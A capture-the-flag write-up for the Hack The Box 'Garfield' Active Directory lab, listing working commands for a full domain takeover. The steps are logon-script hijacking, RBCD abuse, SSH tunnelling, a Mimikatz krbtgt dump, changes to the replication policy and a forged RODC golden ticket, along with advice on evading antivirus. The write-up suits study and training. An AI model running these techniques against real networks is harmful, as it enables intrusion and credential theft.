# HTB Garfield Writeup

## Machine Overview

**Garfield** is a hard Windows Active Directory machine featuring a dual-DC environment: a writable primary DC (DC01) and an internal Read-Only DC (RODC01) on a non-routable segment. The chain demands mastery of AD ACL delegation, RBCD, RODC Kerberos mechanics, AV evasion, and precise Kerberos ticket construction. Every phase feeds directly into the next with zero margin for error.

| Attribute | Value |
|-----------|-------|
| Domain | GARFIELD.HTB |
| Domain SID | S-1-5-21-2502726253-3859040611-225969357 |
| DC01 IP | 10.129.255.225 |
| RODC01 IP | 192.168.100.2 (internal only) |
| RODC krbtgt RID | 8245 → KVNO = 540344321 |
| Initial Creds | j.arbuckle : Th1sD4mnC4t!@1978 |
| Foothold Creds | l.wilson_adm : H4ck3dPass123! |
| Attacker Machine | FAKEBOX$ : FakePass123! |

**Full Attack Chain:** Unauthenticated LDAP leaks j.arbuckle credentials from description field → GenericWrite + SYSVOL write enables logon script hijack → l.wilson fires Reset Password on l.wilson_adm → GenericWrite on RODC01$ enables RBCD via FAKEBOX$ → SSH reverse tunnel through DC01 bridges RODC01 → psexec delivers SYSTEM on RODC01 → Mimikatz dumps krbtgt_8245 AES256 → PRP modified over LDAP/NTLM (both NeverReveal entries removed) → RODC Golden Ticket forged (KVNO=540344321, both locations patched) → getST cifs/DC01 → root.

---

## Reconnaissance & Enumeration

### Nmap — Full Port Scan

Full TCP scan confirms a Domain Controller running Windows Server 2019. Key services: SMB (445), WinRM (5985), LDAP (389/3268), Kerberos (88). Host script confirms `DC01.garfield.htb` with SMB signing required.

```bash
nmap -sC -sV -p- --min-rate 5000 -oA garfield_full 10.129.255.225
```

```
PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP
445/tcp   open   microsoft-ds Windows Server 2019 microsoft-ds
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open   mc-nmf       .NET Message Framing

Computer name:  DC01
Domain name:    garfield.htb
FQDN:           DC01.garfield.htb
OS:             Windows Server 2019 Standard 10.0.17763
```

```bash
echo "10.129.255.225  garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts
```

### SMB Enumeration — SYSVOL Logon Script

SYSVOL is world-readable on all Windows DCs. Anonymous enumeration finds a logon script `printerDetect.bat` — confirming logon scripts are in active use and establishing the write target for the upcoming hijack.

```bash
crackmapexec smb 10.129.255.225 -u '' -p '' --shares
smbclient //10.129.255.225/SYSVOL -N -c 'ls'
```

```
SYSVOL  → garfield.htb/scripts/printerDetect.bat
```

> **Logon Script Identified:** If we control a user's `scriptPath` LDAP attribute and can write this file, we achieve code execution as that user on their next domain logon.

### LDAP Enumeration — Password in Description

Unauthenticated LDAP query surfaces a cleartext password in `j.arbuckle`'s description attribute — a common IT-support misconfiguration where helpdesk credentials are stored for "convenience."

```bash
ldapsearch -x -H ldap://10.129.255.225 -b "DC=garfield,DC=htb" \
  "(objectClass=user)" sAMAccountName description
```

```
sAMAccountName: j.arbuckle
description: Th1sD4mnC4t!@1978
```

**Credentials Found:** `j.arbuckle : Th1sD4mnC4t!@1978`

> ⚠️ **Gotcha — Read Carefully:** The password contains `D4mn` not `D4wn`. This causes silent authentication failure if misread. Copy character by character.

### BloodHound — Full ACL Graph

BloodHound reveals the complete delegation chain, mapping four principals into a direct attack path from initial access all the way to RODC01$.

```bash
bloodhound-python -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  -d garfield.htb -dc DC01.garfield.htb -c All --zip
```

```
j.arbuckle
  └─[GenericWrite]→ l.wilson
       └─[ResetPassword]→ l.wilson_adm
            └─[GenericWrite]→ RODC01$
```

**Key ACL Edges:**
- j.arbuckle has GenericWrite on l.wilson and write access to SYSVOL scripts
- l.wilson has ResetPassword on l.wilson_adm
- l.wilson_adm has GenericWrite on RODC01$ — enabling RBCD
- RODC01 (192.168.100.2) is internal-only, requiring a pivot through DC01

---

## Foothold — SYSVOL scriptPath Hijacking

### Malicious Logon Script Construction

GenericWrite on l.wilson lets us set the `scriptPath` attribute — the DC attribute that specifies which script runs at logon. Combined with write access to SYSVOL scripts, this gives code execution as l.wilson on their next domain logon. The payload exercises l.wilson's Reset Password right (User-Force-Change-Password) on l.wilson_adm — no knowledge of the current password required.

```powershell
# Payload (Base64-encoded for -EncodedCommand)
$s = ConvertTo-SecureString 'H4ck3dPass123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $s -Reset
```

```batch
# /tmp/printerDetect_full.bat
@echo off
powershell -enc <BASE64_PAYLOAD>
```

### Deploy & Wait — WinRM Foothold

Upload the malicious bat over SMB, overwriting the legitimate file. Then set l.wilson's `scriptPath` via bloodyAD. Poll WinRM until the periodic simulated logon fires the script and the new password becomes valid.

```bash
# Upload malicious bat
smbclient //10.129.255.225/SYSVOL -U 'garfield.htb\j.arbuckle%Th1sD4mnC4t!@1978' \
  -c 'put /tmp/printerDetect_full.bat garfield.htb/scripts/printerDetect.bat'

# Set scriptPath on l.wilson
python3 bloodyAD.py -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  -d garfield.htb --host 10.129.255.225 \
  set object l.wilson scriptPath \
  -v 'garfield.htb\scripts\printerDetect.bat'

# Poll WinRM until credentials work
while true; do
  crackmapexec winrm 10.129.255.225 \
    -u l.wilson_adm -p 'H4ck3dPass123!' 2>/dev/null | grep -q "Pwn3d" && break
  sleep 30
done

# WinRM shell
evil-winrm -i 10.129.255.225 -u l.wilson_adm -p 'H4ck3dPass123!'
```

**Foothold Obtained:** `l.wilson_adm : H4ck3dPass123!` — WinRM shell after ~8–10 minutes when the simulated logon fires.

**User Flag** — `l.wilson_adm Desktop`

---

## RBCD — Admin@cifs/RODC01

### Create FAKEBOX$ & Set RBCD on RODC01$

RBCD lets a resource declare which accounts may delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. With GenericWrite on RODC01$, we add an attacker-controlled machine account (FAKEBOX$) as a trusted delegator. Impacket's getST.py then performs S4U2Self + S4U2Proxy to impersonate Administrator to RODC01.

> ⚠️ **Clock Skew — Critical:** DC01 runs ~8 hours ahead. GSSAPI reads the hardware clock and bypasses LD_PRELOAD entirely. All LDAP operations must use NTLM authentication, not Kerberos SASL. Use `FAKETIME=+28797s` with libfaketime for all Python/Impacket Kerberos calls.

```bash
# Create machine account
addcomputer.py -computer-name 'FAKEBOX$' -computer-pass 'FakePass123!' \
  -dc-ip 10.129.255.225 'garfield.htb/l.wilson_adm:H4ck3dPass123!'

# Set RBCD on RODC01$
rbcd.py -delegate-from 'FAKEBOX$' -delegate-to 'RODC01$' \
  -action write -dc-ip 10.129.255.225 \
  'garfield.htb/l.wilson_adm:H4ck3dPass123!'
```

### S4U2Self + S4U2Proxy → Administrator@cifs/RODC01

Obtain a TGT for FAKEBOX$ using its password, then perform the two-stage S4U delegation to yield a service ticket for Administrator at cifs/RODC01. The ticket is valid — but RODC01 is not routable from Kali, requiring a network pivot.

```bash
# TGT for FAKEBOX$
getTGT.py garfield.htb/FAKEBOX\$:FakePass123! -dc-ip 10.129.255.225
export KRB5CCNAME=FAKEBOX\$.ccache

# S4U2Self
getST.py -spn cifs/RODC01.garfield.htb -impersonate Administrator \
  -self -dc-ip 10.129.255.225 garfield.htb/FAKEBOX\$:FakePass123!

# S4U2Proxy
getST.py -spn cifs/RODC01.garfield.htb -impersonate Administrator \
  -additional-ticket FAKEBOX\$.ccache \
  -dc-ip 10.129.255.225 garfield.htb/FAKEBOX\$:FakePass123!
# Saved: Administrator@cifs_RODC01.garfield.htb.ccache
```

**Service Ticket Obtained:** Valid Administrator@cifs/RODC01 ccache in hand. RODC01 is at 192.168.100.2 — not reachable from Kali. A reverse SSH tunnel through DC01 is required.

---

## Network Pivot — SSH Tunnel + psexec Patch

### Reverse SSH Tunnel via DC01 (AV-Safe)

Chisel and Ligolo are killed by AV within seconds. OpenSSH is pre-installed on Windows Server 2019, Microsoft-signed, and not flagged. A custom sshd is deployed on DC01 with `GatewayPorts yes`. SSH is invoked from DC01 back to Kali, forwarding RODC01's ports. The `-N` flag keeps the tunnel alive without executing a shell.

```
# /tmp/sshd_custom/sshd_config
Port 2222
GatewayPorts yes
AllowTcpForwarding yes
AuthorizedKeysFile /tmp/sshd_custom/authorized_keys
PubkeyAuthentication yes
PasswordAuthentication no
```

```bash
# SSH from Kali to DC01, forward RODC01 ports back
ssh -i /tmp/sshd_custom/dc01_key \
  -p 2222 [email protected] \
  -R 10445:192.168.100.2:445 \
  -R 15985:192.168.100.2:5985 \
  -N
```

**Tunnel Established:** `localhost:10445 → RODC01:445` | `localhost:15985 → RODC01:5985`

### socat + Socket Monkey-Patch → SYSTEM on RODC01

Impacket's psexec hardcodes port 445. Our tunnel is on 10445. A socat relay bridges 1445→10445 at the OS level. A Python socket monkey-patch overrides `connect()` and `getaddrinfo()` at runtime to redirect all RODC01 SMB traffic transparently through the local relay.

```bash
# socat relay
socat TCP-LISTEN:1445,fork,reuseaddr TCP:127.0.0.1:10445 &
```

```python
# /tmp/patch_socket.py
import socket
_orig_connect = socket.socket.connect
_orig_gai = socket.getaddrinfo

def _patched_connect(self, address):
    host, port = address[0], address[1]
    if port == 445:
        address = ('127.0.0.1', 1445)
    return _orig_connect(self, address)

def _patched_gai(host, port, *args, **kwargs):
    if port == 445:
        host, port = '127.0.0.1', 1445
    return _orig_gai(host, port, *args, **kwargs)

socket.socket.connect = _patched_connect
socket.getaddrinfo = _patched_gai
```

```bash
# psexec via tunnel
export KRB5CCNAME=Administrator@cifs_RODC01.ccache
KRB5_CONFIG=/tmp/krb5.conf python3 /tmp/rodc01_psexec.py \
  -k -no-pass garfield.htb/[email protected]
```

```
C:\Windows\system32> whoami
nt authority\system
```

**SYSTEM on RODC01:** Full NT AUTHORITY\SYSTEM shell via tunnelled Kerberos psexec with runtime socket monkey-patch.

---

## RODC Operations — krbtgt_8245 & PRP

### Dumping krbtgt_8245 via Mimikatz

Each RODC has a per-instance `krbtgt_<RID>` account. RODC01 signs all Kerberos tickets with krbtgt_8245's key. DC01 holds a replica of this key and validates RODC-issued tickets with it. Rubeus (.NET with prominent Kerberos API signatures) is heuristically killed by AV before execution completes. Mimikatz's LSA injection path finishes within AV's detection window.

```
lsadump::lsa /inject /name:krbtgt_8245
```

```
SAMAccountName : krbtgt_8245
  NTLM : 445aa4221e751da37a10241d962780e2
  AES256: d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240

RODC01$ NT: 0a3f810964bb5e1f0e52245f73700172
Domain SID: S-1-5-21-2502726253-3859040611-225969357
```

**RODC Signing Key Extracted:** krbtgt_8245 AES256 = `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`

### Modifying the RODC Password Replication Policy

The PRP governs which accounts RODC01 may cache credentials for. By default Administrator is blocked by two NeverRevealGroup entries, evaluated transitively. Both must be removed. RODC01$ cannot modify its own PRP (deliberate Microsoft restriction). l.wilson_adm's GenericWrite ACL on the RODC01 computer object covers this operation. NTLM authentication is mandatory to avoid GSSAPI clock skew failure.

> ⚠️ **Critical — Remove Both Entries:** Removing only `Denied RODC Password Replication Group` still blocks Administrator transitively via `CN=Administrators,CN=Builtin`. DC01 returns `KDC_ERR_TGT_REVOKED` if either entry remains.

```python
# /tmp/modify_prp.py
from ldap3 import Server, Connection, NTLM, MODIFY_DELETE, MODIFY_ADD

conn = Connection(Server('10.129.255.225', get_info='ALL'),
    user='garfield.htb\\l.wilson_adm',
    password='H4ck3dPass123!',
    authentication=NTLM)
conn.bind()

rodc_dn       = 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb'
denied_dn     = 'CN=Denied RODC Password Replication Group,CN=Users,DC=garfield,DC=htb'
builtin_dn    = 'CN=Administrators,CN=Builtin,DC=garfield,DC=htb'
admin_dn      = 'CN=Administrator,CN=Users,DC=garfield,DC=htb'

# Remove BOTH NeverReveal entries (transitive block — must remove both)
conn.modify(rodc_dn, {
    'msDS-NeverRevealGroup': [
        (MODIFY_DELETE, [denied_dn]),
        (MODIFY_DELETE, [builtin_dn]),
    ]
})
print(conn.result)

# Add Administrator to RevealOnDemandGroup
conn.modify(rodc_dn, {
    'msDS-RevealOnDemandGroup': [(MODIFY_ADD, [admin_dn])]
})
print(conn.result)
```

```bash
python3 /tmp/modify_prp.py
NeverReveal removal: success
RevealOnDemand addition: success
```

---

## RODC Golden Ticket — Domain Admin

### KVNO Calculation & ticketer.py Dual-Patch

When DC01 receives a ticket signed by an RODC krbtgt key, it reads the KVNO to identify the issuing RODC, verifies the signature using that RODC's key, then evaluates the PRP. For RODC-issued tickets, KVNO encodes the RODC's krbtgt RID in the upper 16 bits. Impacket's ticketer.py sets this value in two separate locations — both must be patched.

```python
# KVNO = (krbtgt_RID << 16) | 1
# KVNO = (8245 << 16) | 1
KVNO = 540344321
```

> ⚠️ **Patch Two Locations in ticketer.py:** The inner `EncTicketPart` (~line 441) and the outer ticket wrapper (~line 1052) both contain KVNO assignments. Patching only one causes `KRB_AP_ERR_MODIFIED` from DC01. Both must be set to `540344321`.

```bash
# Forge RODC Golden Ticket
cp /opt/impacket/examples/ticketer.py /tmp/rodc_ticketer.py
# Edit: set KVNO to 540344321 at BOTH locations (~line 441 and ~line 1052)

FAKETIME=+28797s KRB5CCNAME=Administrator.ccache \
python3 /tmp/rodc_ticketer.py \
  -nthash    445aa4221e751da37a10241d962780e2 \
  -aesKey    d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 \
  -domain    garfield.htb \
  -domain-sid S-1-5-21-2502726253-3859040611-225969357 \
  -user-id   500 \
  -groups    512,513,518,519,520 \
  -dc-ip     10.129.255.225 \
  Administrator
```

### getST → cifs/DC01 → Root Flag

Submit the forged RODC Golden TGT to DC01's KDC. The KDC reads KVNO 540344321, retrieves krbtgt_8245's key, verifies the signature, confirms Administrator passes the PRP checks, and issues a legitimate cifs/DC01 service ticket. Full Administrator access to DC01's filesystem.

```bash
# Exchange Golden TGT for cifs/DC01
FAKETIME=+28797s KRB5CCNAME=Administrator.ccache \
getST.py -spn cifs/DC01.garfield.htb -k -no-pass \
  -dc-ip 10.129.255.225 garfield.htb/Administrator
# Saved: Administrator@cifs_DC01.garfield.htb.ccache

# Access DC01 C$
FAKETIME=+28797s KRB5CCNAME=Administrator@cifs_DC01.garfield.htb.ccache \
smbclient //DC01.garfield.htb/C$ -k -no-pass

smb: \> get Users\Administrator\Desktop\root.txt
```

**Root Flag** — `Administrator Desktop`

---

## Attack Summary

| Step | Action | Result |
|------|--------|--------|
| 01 | Unauthenticated LDAP — Password in Description | j.arbuckle : Th1sD4mnC4t!@1978 (read carefully: D4mn not D4wn) |
| 02 | SMB SYSVOL — Logon Script Discovered | printerDetect.bat identified as write-controllable code execution vector |
| 03 | BloodHound ACL Mapping | Full chain: j.arbuckle → GenericWrite → l.wilson → ResetPassword → l.wilson_adm → GenericWrite → RODC01$ |
| 04 | SYSVOL scriptPath Hijacking | Malicious bat uploaded; l.wilson logon fires Reset Password on l.wilson_adm |
| 05 | WinRM Foothold + User Flag | evil-winrm as l.wilson_adm : H4ck3dPass123! |
| 06 | RBCD — FAKEBOX$ Delegator on RODC01$ | S4U2Self + S4U2Proxy yields Administrator@cifs/RODC01 ccache |
| 07 | SSH Reverse Tunnel + socat + Socket Patch | RODC01:445 reachable at localhost:1445; psexec delivers SYSTEM |
| 08 | Mimikatz — krbtgt_8245 AES256 Dumped | RODC signing key extracted before AV detection window closes |
| 09 | PRP Modification via LDAP/NTLM | Both NeverReveal entries removed; Administrator added to RevealOnDemand |
| 10 | RODC Golden Ticket (KVNO=540344321) | Both ticketer.py KVNO locations patched; signed with krbtgt_8245 AES256 |
| 11 | DC01 KDC Validates — cifs/DC01 TGS Issued | smbclient as Administrator; root.txt captured |

---

## Key Takeaways

### 01 — LDAP Description Fields Are a Password Store
IT teams routinely embed credentials in AD description fields for convenience. These attributes are readable by any authenticated — or in misconfigured environments, unauthenticated — LDAP client. Regular AD audits must scan all user attributes for secret-like strings and enforce a dedicated secrets management policy.

### 02 — GenericWrite + SYSVOL = RCE Without Any CVE
Combining GenericWrite on a user (to set scriptPath) with write access to SYSVOL scripts achieves reliable code execution using only AD misconfiguration — no vulnerability required. OU-level delegation must be scoped to the minimum necessary attributes, and SYSVOL write access must be restricted to Domain Admins only.

### 03 — RODC PRP DenyList Is Transitive — Both Entries Must Go
The NeverRevealGroup is evaluated through full transitive group membership. A principal blocked via any group in the chain — including Builtin Administrators — remains blocked even after direct deny entries are removed. PRP manipulation must resolve the complete transitive closure of DenyList membership before assuming access is clear.

### 04 — RODC Golden Tickets Demand Precise KVNO at Both Locations
RODC Golden Tickets encode the RODC's krbtgt RID in the upper 16 bits of the KVNO. This value must be consistent in both the inner EncTicketPart and the outer ticket wrapper in ticketer.py. A single mismatched KVNO produces `KRB_AP_ERR_MODIFIED` from DC01 with no further diagnostic information.

### 05 — AV Evasion via Signed OS Binaries
Third-party tunnelling tools and .NET offensive tooling carry heuristic AV signatures and are killed within seconds. Microsoft-signed, pre-installed binaries like OpenSSH are implicitly trusted. Living-off-the-land techniques combined with inline WinRM execution avoid the child-process spawning patterns that behavioral AV monitors.

### 06 — GSSAPI Clock Enforcement Cannot Be Bypassed with LD_PRELOAD
GSSAPI reads the hardware clock directly and ignores libfaketime. Under significant clock skew, any Kerberos-based LDAP binding will fail regardless of environment variables. Use NTLM authentication for all LDAP operations in high-skew environments, reserving libfaketime for Python-level Impacket calls that respect LD_PRELOAD.

---

## Key Gotchas

| Issue | Symptom | Fix |
|-------|---------|-----|
| D4mn vs D4wn in password | Silent auth failure | Copy character by character from LDAP output |
| KVNO patched at only one location | KRB_AP_ERR_MODIFIED from DC01 | Patch both EncTicketPart (~441) and outer wrapper (~1052) in ticketer.py |
| PRP DenyList is transitive | KDC_ERR_TGT_REVOKED after partial removal | Remove both Denied RODC PRP Group AND CN=Administrators,CN=Builtin |
| GSSAPI bypasses libfaketime | Kerberos LDAP fails under clock skew | Use NTLM authentication for all LDAP operations |
| Impacket hardcodes port 445 | Cannot reach RODC01 via tunnel | socat relay + Python socket monkey-patch for runtime port redirect |
| AV kills Chisel / Ligolo / Rubeus | Tunnel or extraction fails immediately | Built-in OpenSSH for tunnelling; Mimikatz for key extraction |
| RODC01$ cannot modify its own PRP | insufficientAccessRights on LDAP modify | Use l.wilson_adm's delegated GenericWrite ACL on RODC01 computer object |
| Clock skew ~8h on DC01 | All Kerberos operations fail | FAKETIME=+28797s with libfaketime.so.1 for all Impacket calls |
